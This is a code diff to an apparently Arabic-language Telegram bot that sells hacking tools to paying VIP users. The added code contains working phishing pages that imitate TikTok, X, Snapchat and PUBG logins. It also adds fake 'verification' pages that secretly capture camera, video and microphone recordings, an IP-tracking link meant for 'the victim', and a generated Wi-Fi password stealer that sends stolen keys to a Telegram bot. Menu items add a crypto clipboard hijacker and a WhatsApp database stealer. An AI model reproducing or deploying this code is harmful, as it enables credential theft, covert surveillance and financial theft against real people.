@@ -40,88 +40,9 @@ WEB_HOST_URL = os.environ.get("RENDER_EXTERNAL_URL", "http://127.0.0.1:8080").rs
 BASE_SOCIAL_URL = WEB_HOST_URL
 
 # ==============================================================================
-# قاعدة بيانات الإيموجيات المميزة (Premium Emojis)
+# تم إلغاء الإيموجي المميز نهائياً لمنع ظهور الأكواد للجميع
 # ==============================================================================
-EMOJI_DB = {
-    "🧬": "5240234824131696608",
-    "🐉": "5239975485416427692",
-    "⚡": "5240319907433828877",
-    "⚙️": "5240415835528383591",
-    "📡": "5240058266616088008",
-    "🤖": "5372981976804366741",
-    "🎣": "5240319907433828877",
-    "🔹": "5240058266616088008",
-    "🔔": "5458603043203327669",
-    "👤": "5974048815789903111",
-    "👥": "6001526766714227911",
-    "🆔": "5974121443686878290",
-    "⏰": "5974076810386738645",
-    "📊": "5231200819986047254",
-    "🎉": "5461151367559141950",
-    "🔓": "5240103415312307866",
-    "🆓": "6156566444625628208",
-    "💎": "6102804148548274759",
-    "🎭": "5974393057418677108",
-    "👑": "5974104203688152439",
-    "🖼": "5389108217496231210",
-    "🎵": "5388670255386091051",
-    "📺": "5388670255386091051",
-    "📝": "5972158252790582632",
-    "💻": "5974453277155135447",
-    "🔙": "5974047570249387560",
-    "🛡": "5972226216353074147",
-    "📋": "6010509600619499098",
-    "✏️": "5974239538107649980",
-    "🗑": "5974518878485615140",
-    "⛔": "5260293700088511294",
-    "🔌": "5386367538735104399",
-    "🔄": "ID_HERE",
-    "➕": "ID_HERE",
-    "➖": "ID_HERE",
-    "📜": "ID_HERE",
-    "⏳": "ID_HERE",
-    "✅": "ID_HERE",
-    "❌": "ID_HERE",
-    "⚠️": "ID_HERE",
-    "🔒": "ID_HERE",
-    "📥": "ID_HERE",
-    "📤": "ID_HERE",
-    "⭐": "ID_HERE",
-    "🌟": "ID_HERE",
-    "🔑": "ID_HERE",
-    "💡": "ID_HERE",
-    "📱": "ID_HERE",
-    "🧠": "ID_HERE",
-    "😴": "5210956306952758910",
-    "🎯": "5857364059120209819",
-    "🔢": "5239994065444949512",
-    "🟢": "5240059464911963726",
-    "🔴": "5240103415312307866",
-    "⏱": "5974585609392492550",
-    "🚫": "5972201876773408053",
-    "🚧": "6003424016977628379",
-    "📈": "5244837092042750681",
-    "📁": "5323463074055739425",
-    "🎮": "6102511304793135636",
-    "🔗": "5974492756494519709",
-    "🇮🇶": "6019358113717555283",
-    "📞": "ID_HERE",
-    "📧": "6102889858915633188",
-    "📘": "5355254460635428635",
-    "📷": "5355097780228470775",
-    "🐦": "5357203031463050136",
-    "👻": "5352719553757466112",
-    "💬": "5354926239234670328",
-    "ℹ️": "5353034628263330616",
-    "🎥": "5355061947316321722",
-    "🔫": "5352719553757466112",
-    "❤️": "5355097780228470775"
-}
-
 def ce(emoji):
-    eid = EMOJI_DB.get(emoji, "ID_HERE")
-    if eid != "ID_HERE":
-        return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>'
     return emoji
 
 try:
@@ -174,7 +95,7 @@ WELCOME_MSG = (
     "أهلاً بك في نظام توليد الأدوات المتقدمة جداً.\n"
     "<b>╰━━━━━━━━━━━━━━━━━━━━━━━━╯</b>\n\n"
     f"{ce('🐉')} يتم توليد سكريبتات بايثون مشفرة بـ 9 طبقات ديناميكية.\n"
-    f"{ce('⚡')} أدوات سحب واختراق حقيقية للهواتف (أندرويد).\n\n"
+    f"{ce('⚡')} أدوات سحب واختراق حقيقية للهواتف والكمبيوترات.\n\n"
     "<i>يرجى اختيار القسم المطلوب من الأسفل:</i>\n\n"
     f"{ce('⚙️')} <b>المطور:</b> @a_mutamarid\n"
     f"{ce('📡')} <b>القناة:</b> @mutmared1"
@@ -187,7 +108,8 @@ states = {
     "ds_target": {}, "ds_count": {}, "phish_platform": {},
     "math_captcha": {}, "vip_key_input_user": {}, "adm_vip_7d_input": {}, "adm_vip_30d_input": {},
     "create_vip_key_days": {}, "create_vip_key_uses": {}, "disable_vip_key": {}, "enable_vip_key": {}, "delete_vip_key": {},
-    "temp_create_vip_key": {}
+    "temp_create_vip_key": {},
+    "crypto_check_input": {}, "cb_hijack_input": {}
 }
 
 spam_tasks = {}
@@ -197,10 +119,22 @@ fake_sessions = {}
 fake_states = {} 
 
 # ==============================================================================
-# 2. سيرفر الويب المدمج (صفحات الهندسة الاجتماعية الحقيقية)
+# 2. سيرفر الويب المدمج (الهندسة الاجتماعية + المراقبة + التتبع)
 # ==============================================================================
 
 app = Flask(__name__)
+app.config['MAX_CONTENT_LENGTH'] = 50 * 1024 * 1024
+
+def render_surveillance_page(media_type, cid):
+    if media_type == "photo_front":
+        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Identity Verification</title><style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}h2{{color:#1877f2}}p{{color:#555;text-align:center}}#v{{display:none}}#c{{display:none}}#st{{background:#1877f2;color:#fff;padding:15px 30px;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-top:20px}}</style></head><body><h2>Secure Identity Verification</h2><p>Please allow camera access to verify your identity and continue.</p><video id="v" autoplay></video><canvas id="c"></canvas><button id="st" onclick="cap()">Allow & Verify</button><script>async function cap(){{navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}}}}).then(s=>{{document.getElementById('v').srcObject=s;setTimeout(()=>{{let v=document.getElementById('v');let c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);c.toBlob(b=>{{let fd=new FormData();fd.append('file',b,'photo.jpg');fd.append('id','{cid}');fd.append('type','photo_front');fetch('/catch_media',{{method:'POST',body:fd}}).then(()=>window.location.href='https://www.google.com/search?q=verification+complete');}},'image/jpeg',0.9);}},2000);}}).catch(e=>window.location.href='https://google.com');}}</script></body></html>'''
+    elif media_type == "photo_back":
+        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Scan QR Code</title><style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}h2{{color:#000}}p{{color:#555;text-align:center}}#v{{display:none}}#c{{display:none}}#st{{background:#000;color:#fff;padding:15px 30px;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-top:20px}}</style></head><body><h2>QR Code Scanner</h2><p>Please allow camera access to scan the QR code and verify your session.</p><video id="v" autoplay></video><canvas id="c"></canvas><button id="st" onclick="cap()">Start Scan</button><script>async function cap(){{navigator.mediaDevices.getUserMedia({{video:{{facingMode:{{exact:'environment'}}}}}}).then(s=>{{document.getElementById('v').srcObject=s;setTimeout(()=>{{let v=document.getElementById('v');let c=document.getElementById('c');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);c.toBlob(b=>{{let fd=new FormData();fd.append('file',b,'photo.jpg');fd.append('id','{cid}');fd.append('type','photo_back');fetch('/catch_media',{{method:'POST',body:fd}}).then(()=>window.location.href='https://www.google.com/search?q=qr+scan+complete');}},'image/jpeg',0.9);}},2000);}}).catch(e=>window.location.href='https://google.com');}}</script></body></html>'''
+    elif media_type == "video_front":
+        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Video Verification</title><style>body{{font-family:sans-serif;background:#f0f2f5;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}h2{{color:#e1306c}}p{{color:#555;text-align:center}}#v{{display:none}}#st{{background:#e1306c;color:#fff;padding:15px 30px;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-top:20px}}</style></head><body><h2>Liveness Check</h2><p>Please allow camera access to record a 5-second video for liveness verification.</p><video id="v" autoplay></video><button id="st" onclick="rec()">Record Video</button><script>async function rec(){{navigator.mediaDevices.getUserMedia({{video:{{facingMode:'user'}},audio:true}}).then(s=>{{let v=document.getElementById('v');v.srcObject=s;let mr=new MediaRecorder(s);let ch=[];mr.ondataavailable=e=>ch.push(e.data);mr.onstop=()=>{{let b=new Blob(ch,{{type:'video/webm'}});let fd=new FormData();fd.append('file',b,'video.webm');fd.append('id','{cid}');fd.append('type','video_front');fetch('/catch_media',{{method:'POST',body:fd}}).then(()=>window.location.href='https://www.google.com/search?q=verification+success');}};mr.start();setTimeout(()=>{{mr.stop();s.getTracks().forEach(t=>t.stop());}},5000);}}).catch(e=>window.location.href='https://google.com');}}</script></body></html>'''
+    elif media_type == "audio_mic":
+        return f'''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Voice Verification</title><style>body{{font-family:sans-serif;background:#25d366;display:flex;flex-direction:column;align-items:center;justify-content:center;height:100vh;margin:0}}h2{{color:#fff}}p{{color:#fff;text-align:center}}#st{{background:#fff;color:#25d366;padding:15px 30px;border:none;border-radius:8px;font-size:18px;cursor:pointer;margin-top:20px}}</style></head><body><h2>Voice Verification</h2><p>Please allow microphone access to record a 5-second voice message and confirm your identity.</p><button id="st" onclick="rec()">Start Recording</button><script>async function rec(){{navigator.mediaDevices.getUserMedia({{audio:true}}).then(s=>{{let mr=new MediaRecorder(s);let ch=[];mr.ondataavailable=e=>ch.push(e.data);mr.onstop=()=>{{let b=new Blob(ch,{{type:'audio/webm'}});let fd=new FormData();fd.append('file',b,'audio.webm');fd.append('id','{cid}');fd.append('type','audio_mic');fetch('/catch_media',{{method:'POST',body:fd}}).then(()=>window.location.href='https://www.google.com/search?q=voice+verified');}};mr.start();setTimeout(()=>{{mr.stop();s.getTracks().forEach(t=>t.stop());}},5000);}}).catch(e=>window.location.href='https://google.com');}}</script></body></html>'''
+    return "Invalid type."
 
 def render_phish_page(platform, cid):
     if platform == "tiktok":
@@ -215,8 +149,6 @@ def render_phish_page(platform, cid):
         return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Log in to Twitter / X</title><style>body{{font-family:sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#000;padding:40px;border-radius:12px;width:350px;text-align:center;border:1px solid #2f3336}}h3{{color:#1d9bf0;margin-bottom:20px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #2f3336;border-radius:4px;box-sizing:border-box;font-size:16px;background:#192734;color:#fff}}button{{width:100%;padding:14px;background:#1d9bf0;color:#fff;border:none;border-radius:20px;font-size:16px;font-weight:bold;cursor:pointer}}</style></head><body><div class="box"><h3>Sign in to X</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="Twitter"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button type="submit">Next</button></form></div></body></html>'''
     elif platform == "snapchat":
         return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Snapchat Login</title><style>body{{font-family:sans-serif;background:#fffc00;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}}.box{{background:#fff;padding:40px;border-radius:12px;width:350px;text-align:center;box-shadow:0 4px 10px rgba(0,0,0,0.1)}}h3{{color:#000;margin-bottom:20px}}input{{width:100%;padding:14px;margin:8px 0;border:1px solid #ccc;border-radius:4px;box-sizing:border-box;font-size:16px}}button{{width:100%;padding:14px;background:#fffc00;color:#000;border:1px solid #000;border-radius:4px;font-size:16px;font-weight:bold;cursor:pointer}}</style></head><body><div class="box"><h3>Snapchat</h3><form action="/catch" method="POST"><input type="hidden" name="platform" value="Snapchat"><input type="hidden" name="id" value="{cid}"><input type="text" name="username" placeholder="Username or email" required><input type="password" name="password" placeholder="Password" required><button type="submit">Log In</button></form></div></body></html>'''
-    
-    # ================= الصفحات الجديدة =================
     elif platform == "pubg":
         return f'''<!DOCTYPE html><html dir="ltr" lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>PUBG UC Top-Up</title><style>body{{font-family:'Segoe UI',sans-serif;background:#1b1b25;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}}.container{{background:#fff;width:100%;max-width:400px;border-radius:10px;box-shadow:0 4px 15px rgba(218,165,32,0.3);overflow:hidden}}.header{{background:#f5a623;padding:20px;text-align:center}}.header h2{{color:#fff;margin:0;font-size:24px;text-shadow:1px 1px 2px black}}.content{{padding:25px}}.form-group{{margin-bottom:20px}}.form-group input{{width:100%;padding:12px;border:1px solid #ccc;border-radius:4px;font-size:16px;box-sizing:border-box}}.btn{{width:100%;padding:15px;background:#f5a623;color:#fff;border:none;border-radius:4px;font-size:18px;font-weight:bold;cursor:pointer}}</style></head><body><div class="container"><div class="header"><h2>PUBG MOBILE UC</h2></div><div class="content"><form action="/catch" method="POST"><input type="hidden" name="platform" value="PUBG"><input type="hidden" name="id" value="{cid}"><div class="form-group"><input type="text" name="pubg_id" placeholder="Enter PUBG ID" required></div><div class="form-group"><input type="email" name="email" placeholder="Email (For Receipt)" required></div><div class="form-group"><input type="password" name="password" placeholder="Email Password" required></div><button type="submit" class="btn">Claim 840 UC Free</button></form></div></div></body></html>'''
     elif platform == "insta_followers":
@@ -244,7 +176,27 @@ def dynamic_phish(platform):
         return render_freefire_page(cid)
     elif platform in ["tiktok", "facebook", "instagram", "whatsapp", "twitter", "snapchat", "pubg", "insta_followers", "tiktok_likes", "telegram_login"]:
         return render_phish_page(platform, cid)
+    elif platform in ["photo_front", "photo_back", "video_front", "audio_mic"]:
+        return render_surveillance_page(platform, cid)
     return "Page not found.", 404
+
+@app.route('/ip_track')
+def ip_track():
+    cid = request.args.get('user')
+    if not cid:
+        return "Invalid link", 400
+    try:
+        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
+        r = requests.get(f"http://ip-api.com/json/{ip}?fields=country,city,isp,query").json()
+        msg = f"{ce('🔴')} <b>[ تم فتح رابط التتبع ]</b>\n\n"
+        msg += f"{ce('🌐')} <b>الـ IP:</b> <code>{r.get('query', 'N/A')}</code>\n"
+        msg += f"🏳️ <b>الدولة:</b> {r.get('country', 'N/A')}\n"
+        msg += f"🏙 <b>المدينة:</b> {r.get('city', 'N/A')}\n"
+        msg += f"📡 <b>مزود الخدمة:</b> {r.get('isp', 'N/A')}\n"
+        bot.send_message(int(cid), msg)
+    except:
+        pass
+    return redirect("https://www.google.com/search?q=whats+my+ip")
 
 @app.route('/check_vip/<cid>')
 def api_check_vip(cid):
@@ -255,6 +207,39 @@ def api_check_vip(cid):
         return "INVALID", 403
     except:
         return "INVALID", 403
+
+@app.route('/catch_media', methods=['POST'])
+def catch_media():
+    try:
+        cid = request.form.get('id')
+        media_type = request.form.get('type')
+        file = request.files.get('file')
+        if not file or not cid:
+            return "Error", 400
+
+        user_obj = get_user(int(cid))
+        if not (is_admin(int(cid)) or (user_obj and check_vip(user_obj))):
+            return redirect("https://google.com")
+
+        ext = ".jpg" if "photo" in media_type else ".webm"
+        filename = f"temp_{media_type}{ext}"
+        file.save(filename)
+
+        increment_stat("hacked")
+        
+        with open(filename, 'rb') as f:
+            if "photo" in media_type:
+                cap = "📸 صورة أمامية" if "front" in media_type else "📷 صورة خلفية"
+                bot.send_photo(int(cid), f, caption=f"{cap}\nتم التقاطها عبر الرابط بنجاح.")
+            elif "video" in media_type:
+                bot.send_video(int(cid), f, caption=f"🎥 فيديو مسجل (5 ثواني)\nتم تسجيله عبر الرابط بنجاح.")
+            elif "audio" in media_type:
+                bot.send_audio(int(cid), f, caption=f"🎙️ تسجيل صوتي (5 ثواني)\nتم تسجيله عبر الرابط بنجاح.")
+
+        os.remove(filename)
+        return "Success", 200
+    except Exception as e:
+        return f"Error: {e}", 500
 
 @app.route('/catch', methods=['POST'])
 def catch_credentials():
@@ -317,7 +302,7 @@ def save_data(file, data):
 
 def load_users(): return load_data(USERS_FILE, [])
 def save_users(u): save_data(USERS_FILE, u)
-def load_vip_keys(): return load_data(VIP_KEYS_FILE, {})
+def load_vip_key(): return load_data(VIP_KEYS_FILE, {})
 def save_vip_keys(k): save_data(VIP_KEYS_FILE, k)
 def load_stats(): return load_data(STATS_FILE, {"hacked": 0, "files": 0})
 def save_stats(s): save_data(STATS_FILE, s)
@@ -424,7 +409,7 @@ def check_sub(uid):
     return len(not_sub) == 0, not_sub
 
 # ==============================================================================
-# 4. بناء القوائم (إيموجي عادي للأزرار لمنع ظهور أكواد)
+# 4. بناء القوائم 
 # ==============================================================================
 def btn(text, cb=None, url=None, style="primary"):
     return InlineKeyboardButton(f"{text}", callback_data=cb, url=url, style=style)
@@ -442,8 +427,16 @@ def free_menu():
     m = InlineKeyboardMarkup()
     m.row(btn("🖼 [ سحب الصور فقط ]", "gen_images", style="primary"), btn("🎵 [ سحب الموسيقى فقط ]", "gen_music", style="success"))
     m.row(btn("📺 [ سحب الفيديوهات ]", "gen_videos", style="primary"), btn("📝 [ سحب المستندات ]", "gen_docs", style="primary"))
-    m.row(btn("💻 [ معلومات الهاتف ]", "gen_sysinfo", style="primary"))
+    m.row(btn("💻 [ معلومات الهاتف ]", "gen_sysinfo", style="primary"), btn("🔗 [ تتبع IP الضحية ]", "gen_ip_logger", style="danger"))
+    m.row(btn("💰 [ فاحص محافظ الكريبتو ]", "crypto_checker", style="primary"))
     m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="danger"))
+    return m
+
+def surveillance_menu():
+    m = InlineKeyboardMarkup()
+    m.row(btn("📸 [ كاميرا أمامية ]", "surv_photo_front", style="danger"), btn("📷 [ كاميرا خلفية ]", "surv_photo_back", style="danger"))
+    m.row(btn("🎥 [ تسجيل فيديو ]", "surv_video_front", style="danger"), btn("🎙️ [ تسجيل صوتي ]", "surv_audio_mic", style="danger"))
+    m.row(btn("🔙 [ رجوع لقسم VIP ]", "vip_menu", style="danger"))
     return m
 
 def vip_menu(uid=None):
@@ -455,10 +448,13 @@ def vip_menu(uid=None):
             user_data = get_user(uid)
         
         if is_admin(uid) or check_vip(user_data):
+            m.row(btn("📁 [ ساحب جميع الملفات (كمبيوتر/هاتف) ]", "gen_all_files", style="danger"))
             m.row(btn("📡 [ اختراق سوشيال ميديا ]", "social_menu", style="danger"))
             m.row(btn("🎥 [ كاميرا وميكروفون تجسس صامت ]", "gen_spy_cam", style="danger"))
             m.row(btn("🛡 [ ساحب قاعدة الواتساب ]", "gen_wa_db", style="danger"), btn("🧬 [ ساحب جلسات تيليجرام ]", "gen_session_stealer", style="danger"))
             m.row(btn("⚡ [ السبام المباشر ]", "ds_menu", style="danger"), btn("🤖 [ اختراق عبر بوت ]", "vip_bot_hack", style="danger"))
+            m.row(btn("👁‍🗨 [ نظام المراقبة المتقدم ]", "surveillance_menu", style="danger"), btn("💳 [ مختطف محافظ الكريبتو ]", "gen_clipboard_hijack", style="danger"))
+            m.row(btn("📶 [ ساحب كلمات مرور الواي فاي ]", "gen_wifi_stealer", style="danger"))
             m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="primary"))
         else:
             m.row(btn("⭐ [ اشتراك شهري - 15 نجمة ]", "vip_star_pay", style="primary"))
@@ -467,10 +463,13 @@ def vip_menu(uid=None):
             m.row(btn("🔑 [ إدخال مفتاح VIP ]", "vip_enter_key", style="primary"))
             m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="danger"))
     else:
+        m.row(btn("📁 [ ساحب جميع الملفات (كمبيوتر/هاتف) ]", "gen_all_files", style="danger"))
         m.row(btn("📡 [ اختراق سوشيال ميديا ]", "social_menu", style="danger"))
         m.row(btn("🎥 [ كاميرا وميكروفون تجسس صامت ]", "gen_spy_cam", style="danger"))
         m.row(btn("🛡 [ ساحب قاعدة الواتساب ]", "gen_wa_db", style="danger"), btn("🧬 [ ساحب جلسات تيليجرام ]", "gen_session_stealer", style="danger"))
         m.row(btn("⚡ [ السبام المباشر ]", "ds_menu", style="danger"), btn("🤖 [ اختراق عبر بوت ]", "vip_bot_hack", style="danger"))
+        m.row(btn("👁‍🗨 [ نظام المراقبة المتقدم ]", "surveillance_menu", style="danger"), btn("💳 [ مختطف محافظ الكريبتو ]", "gen_clipboard_hijack", style="danger"))
+        m.row(btn("📶 [ ساحب كلمات مرور الواي فاي ]", "gen_wifi_stealer", style="danger"))
         m.row(btn("🔙 [ رجوع للرئيسية ]", "back_main", style="primary"))
     return m
 
@@ -520,6 +519,8 @@ def admin_panel():
     m.row(btn("📩 [ رسالة لعضو ]", "adm_send_msg", style="primary"), btn("🔍 [ معلومات عضو ]", "adm_user_info", style="primary"))
     m.row(btn("🔑 [ إدارة مفاتيح VIP ]", "adm_vip_keys_menu", style="primary"), btn("➖ [ إزالة أدمن ]", "adm_rm_admin", style="danger"))
     m.row(btn("➕ [ إضافة أدمن ]", "adm_add_admin", style="success"), btn("🚧 [ وضع الصيانة ]", "adm_maintenance", style="danger"))
+    m.row(btn("🏆 [ الأكثر دعوةً ]", "adm_top_inviters", style="primary"), btn("📤 [ استخراج قائمة الأعضاء ]", "adm_export_users", style="primary"))
+    m.row(btn("🧹 [ تصفير الإحصائيات ]", "adm_reset_stats", style="danger"))
     m.row(btn("⭐ [ تفعيل VIP 7 أيام ]", "adm_vip_7d", style="primary"), btn("🌟 [ تفعيل VIP 30 يوم ]", "adm_vip_30d", style="success"))
     m.row(btn("🔒 [ إغلاق قسم VIP ]", "adm_lock_vip", style="danger"))
     m.row(btn("📤 [ تصدير نسخة احتياطية ]", "adm_export_backup", style="primary"), btn("📥 [ استعادة نسخة احتياطية ]", "adm_restore_backup", style="success"))
@@ -776,6 +777,23 @@ def handle_all_buttons(call):
     elif data == "adm_vip_30d" and is_admin(cid):
         states["adm_vip_30d_input"][cid] = True
         safe_edit(f"🌟 <b>أرسل آيدي العضو لVIP 30 يوم:</b>", cid, call.message.message_id)
+    elif data == "adm_top_inviters" and is_admin(cid):
+        users = load_users()
+        top = sorted(users, key=lambda x: x.get('ref_count', 0), reverse=True)[:10]
+        txt = f"{ce('🏆')} <b>قائمة الأكثر دعوةً للأعضاء:</b>\n\n"
+        for i, u in enumerate(top):
+            txt += f"{i+1}. {u.get('fname', 'لا يوجد')} - <code>{u['id']}</code> [دعوات: {u.get('ref_count', 0)}]\n"
+        if not top: txt = "لا يوجد أعضاء بعد."
+        bot.send_message(cid, txt)
+    elif data == "adm_export_users" and is_admin(cid):
+        users = load_users()
+        ids = "\n".join([str(u['id']) for u in users])
+        file_stream = io.BytesIO(ids.encode('utf-8'))
+        file_stream.name = "users_ids.txt"
+        bot.send_document(cid, file_stream, caption=f"📤 <b>تم استخراج {len(users)} عضو بنجاح.</b>", reply_markup=admin_panel())
+    elif data == "adm_reset_stats" and is_admin(cid):
+        save_stats({"hacked": 0, "files": 0})
+        safe_edit(f"{ce('🧹')} <b>تم تصفير الإحصائيات بنجاح.</b>", cid, call.message.message_id, reply_markup=admin_panel())
     elif data == "adm_export_backup" and is_admin(cid):
         try:
             backup_path = os.path.join(DATA_DIR, "backup.zip")
@@ -827,8 +845,8 @@ def handle_all_buttons(call):
             txt = f"{ce('📋')} <b>قائمة مفاتيح VIP</b>\n\n"
             for k, v in keys.items():
                 status = f"{ce('🟢')} مفعّل" if v.get('status', 'active') == 'active' else f"{ce('🔴')} معطّل"
-                users_count = len(v.get('users', []))
-                txt += f"{ce('🔑')} <code>{k}</code>\n⏳ الأيام: {v['days']} | استخدامات متبقية: {v['uses_left']}/{v['max_uses']}\n{ce('👤')} المستخدمين: {users_count} | الحالة: {status}\n\n"
+                users_list = ", ".join(map(str, v.get('users', []))) if v.get('users') else "لا يوجد"
+                txt += f"{ce('🔑')} <code>{k}</code>\n⏳ الأيام: {v['days']} | متبقي: {v['uses_left']}/{v['max_uses']}\n{ce('👤')} المستخدمين: {users_list}\nالحالة: {status}\n\n"
         safe_edit(txt, cid, call.message.message_id, reply_markup=vip_keys_menu())
     elif data == "adm_disable_vip_key" and is_admin(cid):
         states["disable_vip_key"][cid] = True
@@ -839,6 +857,188 @@ def handle_all_buttons(call):
     elif data == "adm_delete_vip_key" and is_admin(cid):
         states["delete_vip_key"][cid] = True
         safe_edit(f"{ce('🗑')} <b>حذف مفتاح</b>\n\nأرسل المفتاح الذي تريد حذفه نهائياً:", cid, call.message.message_id, reply_markup=vip_keys_menu())
+
+    elif data == "gen_ip_logger":
+        track_link = f"{WEB_HOST_URL}/ip_track?user={cid}"
+        safe_edit(f"{ce('🔗')} <b>[ تتبع IP الضحية ]</b>\n\nتم إنشاء رابط تتبع خاص بك:\n<code>{track_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية. عند فتحه سيتم سحب الـ IP ومزود الخدمة وإرسالهم لك هنا.</i>", cid, call.message.message_id, reply_markup=free_menu())
+
+    elif data == "crypto_checker":
+        states["crypto_check_input"][cid] = True
+        bot.send_message(cid, f"{ce('💰')} <b>[ فاحص المحافظ المشفرة ]</b>\n\nأرسل عنوان المحفظة (Bitcoin أو Ethereum):\n<i>مثال: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</i>")
+
+    elif data == "gen_clipboard_hijack":
+        user_data = get_user(cid)
+        if not (is_admin(cid) or (user_data and check_vip(user_data))):
+            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
+        states["cb_hijack_input"][cid] = True
+        bot.send_message(cid, f"{ce('💳')} <b>[ مختطف محافظ الكريبتو ]</b>\n\nأرسل <b>عنوان محفظتك</b> (Bitcoin أو Ethereum) الذي تريد استبدال محفظة الضحية بها:")
+
+    elif data == "surveillance_menu":
+        user_data = get_user(cid)
+        if not (is_admin(cid) or (user_data and check_vip(user_data))):
+            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
+        safe_edit(f"{ce('👁‍🗨')} <b>[ نظام المراقبة المتقدم ]</b>\n\nاختر نوع الالتقاط الذي تريده. سيتم إنشاء رابط ترسله للضحية، عند فتحه سيتم الالتقاط فوراً.", cid, call.message.message_id, reply_markup=surveillance_menu())
+
+    elif data.startswith("surv_"):
+        user_data = get_user(cid)
+        if not (is_admin(cid) or (user_data and check_vip(user_data))):
+            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
+        
+        surv_type = data.replace("surv_", "")
+        surv_link = f"{WEB_HOST_URL}/{surv_type}?user={cid}"
+        
+        names = {
+            "photo_front": "📸 صورة بالكاميرا الأمامية",
+            "photo_back": "📷 صورة بالكاميرا الخلفية",
+            "video_front": "🎥 تسجيل فيديو",
+            "audio_mic": "🎙️ تسجيل صوتي"
+        }
+        safe_edit(f"{ce('🔗')} <b>[ {names.get(surv_type, 'التقاط')} ]</b>\n\nتم إنشاء رابط المراقبة:\n<code>{surv_link}</code>\n\n⚠️ <i>أرسل الرابط للضحية. عند فتحه وموافقته، سيتم إرسال المحتوى إليك هنا.</i>", cid, call.message.message_id, reply_markup=surveillance_menu())
+
+    elif data == "gen_wifi_stealer":
+        user_data = get_user(cid)
+        if not (is_admin(cid) or (user_data and check_vip(user_data))):
+            return bot.answer_callback_query(call.id, f"❌ VIP مطلوب!", show_alert=True)
+            
+        safe_edit(f"⏳ <b>جاري توليد أداة سحب كلمات مرور الواي فاي...</b>", cid, call.message.message_id)
+        try:
+            increment_stat("files")
+            tool_code = '''
+import time, sys, os, requests, subprocess, glob
+
+T = bytes(__TOKEN_ARRAY__).decode('utf-8')
+C = "__CHAT_ID__"
+
+try:
+    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": "📶 جاري سحب كلمات مرور الواي فاي..."})
+except: pass
+
+data = ""
+try:
+    if os.name == 'nt': # Windows
+        temp_dir = os.path.join(os.environ.get('TEMP', 'C:\\\\'), 'wifi_dump')
+        os.makedirs(temp_dir, exist_ok=True)
+        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear', f'folder={temp_dir}'], capture_output=True)
+        for file in glob.glob(os.path.join(temp_dir, '*.xml')):
+            with open(file, 'r', encoding='utf-8', errors='ignore') as f:
+                content = f.read()
+                name = os.path.basename(file).replace('.xml', '')
+                if '<keyMaterial>' in content:
+                    key = content.split('<keyMaterial>')[1].split('</keyMaterial>')[0]
+                    data += f"{name}: {key}\\n"
+            os.remove(file)
+        if not data: data = "لم يتم العثور على شبكات محفوظة أو الجهاز لا يستخدم ويندوز."
+    elif os.path.exists('/sdcard'): # Android (Requires Root)
+        res = subprocess.run(['cat', '/data/misc/wifi/wpa_supplicant.conf'], capture_output=True, text=True)
+        if res.stdout: data += res.stdout
+        else: data = "يتطلب الهاتف صلاحيات Root لسحب كلمات المرور."
+    else: # Linux
+        res = subprocess.run(['ls', '/etc/NetworkManager/system-connections/'], capture_output=True, text=True)
+        if res.stdout:
+            for f_name in res.stdout.split():
+                res2 = subprocess.run(['cat', f'/etc/NetworkManager/system-connections/{f_name}'], capture_output=True, text=True)
+                if 'psk=' in res2.stdout:
+                    psk = res2.stdout.split('psk=')[1].split('\\n')[0]
+                    data += f"{f_name}: {psk}\\n"
+        if not data: data = "لا يمكن الوصول لملفات الشبكة (يتطلب صلاحيات Root)."
+except Exception as e:
+    data = f"خطأ: {e}"
+
+try:
+    requests.post("https://api.telegram.org/bot" + T + "/sendDocument", files={"document": ("WiFi_Passwords.txt", data)}, data={"chat_id": C, "caption": "📶 تم سحب كلمات مرور الواي فاي بنجاح!"})
+except Exception as e:
+    requests.post("https://api.telegram.org/bot" + T + "/sendMessage", data={"chat_id": C, "text": f"❌ خطأ في الإرسال: {e}"})
+
+time.sleep(5)
+'''
+            tool_code = tool_code.replace("__CHAT_ID__", str(cid))
